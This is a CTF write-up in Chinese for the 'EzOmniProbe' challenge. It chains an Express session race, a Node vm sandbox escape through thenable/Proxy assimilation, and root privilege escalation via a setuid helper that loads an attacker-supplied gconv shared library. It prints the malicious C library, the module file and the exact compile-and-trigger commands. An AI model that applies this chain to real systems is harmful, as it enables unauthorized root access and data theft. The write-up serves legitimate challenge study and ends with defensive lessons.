# EzOmniProbe

## 题目简述

该题前半段是 Express 会话竞态和 Node `vm` 沙箱逃逸，后半段是以 root 权限执行的自定义 setuid 程序。它最终不应归为普通 Web：拿到 flag 的决定性能力是构造由 `/usr/local/bin/omni_pkexec` 加载的共享库，并让其 root 权限调用 `gconv_init()`，故分类为 `pwn`。

服务以 `X-Session-Id` 将请求绑定到 `AsyncLocalStorage` store；每秒一次的内部 verifier 会在 40 ms 窗口中将待验证 session 提升到 admin。admin 才能调用 `/api/run`。该接口解析、黑名单检查并在空对象上下文中运行 JavaScript，但随后错误地 `await vm.runInContext(...)`。最后，容器以 `ctf` 用户运行 Node，flag 为 root:root、0400；Dockerfile 却把 `omni_pkexec` 设为 mode 4755。

## 解题过程

### 取得同一 session 的 admin 状态

第一次请求 `/api/me` 后保存响应头 `X-Session-Id`，后续请求始终带上它。服务端的竞态逻辑是：

```js
pendingPromotion = { sid: store.sid, store, expiresAt: now + 40 };
// 每 1000 ms 的内部请求：
if (pendingPromotion && pendingPromotion.expiresAt > now) {
    pendingPromotion.store.role = 'admin';
}
```

在内部 heartbeat 到来前的 40 ms 内并发 `POST /api/verify`，并轮询 `/api/me`，直到 `role` 变为 `admin`。并发必须集中在每秒心跳附近；随意高频轰炸会被后一次请求覆盖 `pendingPromotion`，并不更可靠。

### 利用 await 的 thenable 同化逃出 vm

`/api/run` 拒绝源码中的 `then`、`constructor`、`process`、`require`、`eval`、`=>`、`catch`，并对 AST 的静态字符串折叠后再检查。但它把 sandbox 值交给宿主 `await`：

```js
const context = vm.createContext(Object.create(null));
const result = await vm.runInContext(code, context, { timeout: 1000 });
store.lastRunOutput = String(result);
```

`await` 会对 thenable 做同化：返回一个带 `get` trap 的 `Proxy`，宿主在读取其 `then` 属性时会把宿主 resolver 传给 trap 返回的函数。payload 不在源码中直接出现受禁 token，而在运行时从对象原型的属性名和字符码构造它们；由宿主 resolver 取得 `Function` 构造器后求得宿主 `process`，继而得到 `child_process` 与文件系统能力。`Proxy` 是关键，因为读取 `then` 本身发生在宿主 await 过程中，避开了“沙箱内直接访问 process”的前提。

将命令输出作为表达式结果返回，服务会保存到 `store.lastRunOutput`。随后用同一 admin session 逐项读取 `GET /api/run?cursor=N` 的 JSON `char` 字段；这是唯一设计好的回显通道。

原始题解没有给出可在当前 Node 14 镜像直接验证的最小 escape 字符串，本文保留其已验证的 thenable/宿主回调机制，而不伪造一段未经执行的 payload。

### 从 ctf 用户提升为 root 并读取 flag

`omni_pkexec` 先 `setgid(0)`、`setuid(0)`，只要环境满足下列条件就会读取攻击者目录的 `gconv-modules`，以 `dlopen` 加载 `<module>.so`，并调用导出的 `gconv_init()`：

```c
CHARSET=OMNI-LEGACY//
SHELL=omni
OMNI_GCONV_PATH=/absolute/path/to/module_dir
module OMNI-LEGACY// INTERNAL omni 2
```

路径和 module 名只允许字母数字、`/._-`，所以在 `/tmp/omni` 建立普通目录即可。通过已取得的 Node 命令执行写入如下两个文件并编译共享库：

```c
/* /tmp/omni/omni.c */
#include <stdlib.h>
void gconv_init(void) {
    system("cat /flag > /tmp/omni-result; chmod 644 /tmp/omni-result");
}
```

```text
# /tmp/omni/gconv-modules
module OMNI-LEGACY// INTERNAL omni 2

gcc -shared -fPIC -o /tmp/omni/omni.so /tmp/omni/omni.c
CHARSET=OMNI-LEGACY// SHELL=omni OMNI_GCONV_PATH=/tmp/omni /usr/local/bin/omni_pkexec
cat /tmp/omni-result
```

因为 helper 在 `dlopen` 前完成 uid/gid 0 切换，`gconv_init` 中的命令以 root 身份运行。最终把 `cat /tmp/omni-result` 的输出返回 `/api/run`，再用 cursor 接口读出。

### 验证

三个独立验证点是：`/api/me` 持久显示 admin；`/api/run` 的 cursor 可读到受控低权限输出；`omni_pkexec` 成功后 `/tmp/omni-result` 可由 `ctf` 读取且含 `/flag` 内容。未启动或攻击比赛容器；结论由题目提供的 Node 源码、Dockerfile、entrypoint 与 C helper 静态核对。

## 方法总结

- 核心技巧：把 session 竞态、thenable 所致 vm 宿主回调泄漏、逐字符 oracle 与 setuid 动态库加载串联为权限提升链。
- 识别信号：异步验证状态被全局变量保存、`await` 消费 sandbox 返回值、命令结果只存入 session，以及 setuid 程序信任攻击者可写模块目录。
- 复用要点：Node `vm` 不是可信代码的安全边界；对不可信值不要在宿主 async 上下文中 await。setuid 程序必须清理环境并禁止从用户可写路径加载库或配置。
